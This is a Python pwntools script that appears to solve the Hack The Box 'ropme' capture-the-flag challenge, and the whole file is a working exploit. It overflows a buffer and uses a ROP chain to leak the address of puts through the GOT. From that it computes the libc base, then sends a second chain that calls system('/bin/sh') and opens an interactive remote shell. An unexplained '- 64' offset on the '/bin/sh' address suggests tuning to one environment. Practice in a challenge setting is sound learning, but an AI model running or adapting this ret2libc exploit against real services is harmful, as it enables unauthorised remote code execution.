from pwn import *
#context_level='DEBUG'

p = remote("docker.hackthebox.eu", 30299)
#p = process("./ropme")
elf = ELF("./ropme")
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")

def main():

	main = elf.symbols['main']
	pop_rdi = 0x00000000004006d3 #: pop rdi ; ret
	ret = 0x00000000004004c9 #: ret
	puts_plt = elf.plt['puts']
	puts_got = elf.got['puts']

	payload = ""
	payload += "A"*72
	payload += p64(pop_rdi)
	payload += p64(puts_got)
	payload += p64(puts_plt)
	payload += p64(main)

	p.sendline(payload)

	p.recvline()

	leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
	print(hex(leaked_puts))
	libc.address = leaked_puts - libc.symbols['puts']

	system = libc.symbols['system']
	bin_sh = next(libc.search("/bin/sh\x00")) - 64

	p.recvline()

	payload = ""
	payload += "A"*72
	payload += p64(pop_rdi)
	payload += p64(bin_sh)
	payload += p64(system)

	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
